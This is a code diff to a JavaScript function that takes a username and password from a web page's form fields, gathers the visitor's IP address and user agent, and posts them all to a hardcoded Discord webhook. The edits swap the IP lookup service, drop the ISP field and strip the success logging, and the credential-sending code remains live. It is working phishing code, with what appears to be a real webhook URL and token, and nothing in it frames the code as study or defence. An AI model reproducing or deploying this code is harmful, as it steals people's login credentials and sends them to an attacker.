@@ -3,20 +3,17 @@ async function sendData() {
     const pass = document.getElementById("pass").value;
 
     if (!user || !pass) {
-        console.log("User or password is empty.");
         return;
     }
 
-    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0"; // Replace with your webhook URL
-
-    const ipResponse = await fetch("https://ipinfo.io/json?token=b0138b9c06beb1"); // Replace with your IPinfo token
+    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0";
+    const ipResponse = await fetch("https://api.ipify.org?format=json");
     const ipData = await ipResponse.json();
     const ipAddress = ipData.ip || "[-] Unknown IP";
-    const isp = ipData.org || "[-] Unknown ISP";
     const userAgent = navigator.userAgent;
 
     const payload = {
-        content: `**[+] Username:** ${user}\n**[+] Password:** ${pass}\n**[+] IP Address:** ${ipAddress}\n**[+] ISP:** ${isp}\n**[+] User Agent:** ${userAgent}`
+        content: `**[+] Username:** ${user}\n**[+] Password:** ${pass}\n**[+] IP Address:** ${ipAddress}\n**[+] User Agent:** ${userAgent}`
     };
 
     try {
@@ -28,9 +25,7 @@ async function sendData() {
             body: JSON.stringify(payload)
         });
 
-        if (response.ok) {
-            console.log("Data sent successfully!");
-        } else {
+        if (!response.ok) {
             console.error("Failed to send data:", response.status, response.statusText);
         }
     } catch (error) {
